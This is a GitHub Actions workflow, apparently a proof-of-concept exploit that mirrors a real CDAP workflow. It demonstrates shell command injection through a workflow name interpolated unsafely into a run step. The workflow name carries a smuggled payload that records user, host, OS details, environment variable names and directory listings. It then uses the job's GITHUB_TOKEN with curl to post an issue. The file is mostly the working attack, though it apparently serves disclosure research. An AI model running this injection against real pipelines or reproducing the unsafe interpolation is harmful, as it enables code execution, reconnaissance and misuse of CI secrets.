name: Report Build Result v2
on:
  workflow_run:
    workflows: ['Build with unit tests"; echo "RCE-PROOF user=$(whoami) host=$(hostname)" > pwn_proof.txt; echo "pwd=$(pwd)" >> pwn_proof.txt; id >> pwn_proof.txt; cat /etc/os-release >> pwn_proof.txt 2>/dev/null; env | cut -d= -f1 | sort >> pwn_proof.txt; ls -la >> pwn_proof.txt; curl -s -H "Authorization:token $GH_TOKEN" -X POST https://api.github.com/repos/omarrrfds/poc-cdap-injection/issues -d "{\"title\":\"PoC2 — RCE + recon via injected command using the job''s own GITHUB_TOKEN\",\"body\":\"Filed by the injected command. Full environment recon is in the workflow run log (pwn_proof.txt contents).\"}"; echo "']
    types: [completed]
jobs:
  report:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Write result to BigQuery (vulnerable — mirrors cdap exactly)
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "{ \"repository\": \"${{ github.repository }}\", \"build_name\": \"${{ github.event.workflow.name }}\", \"conclusion\": \"${{ github.event.workflow_run.conclusion }}\" }" | cat
      - name: Check for injection proof
        if: always()
        run: |
          cat pwn_proof.txt 2>/dev/null || echo "NOT FOUND -- injection did not fire"
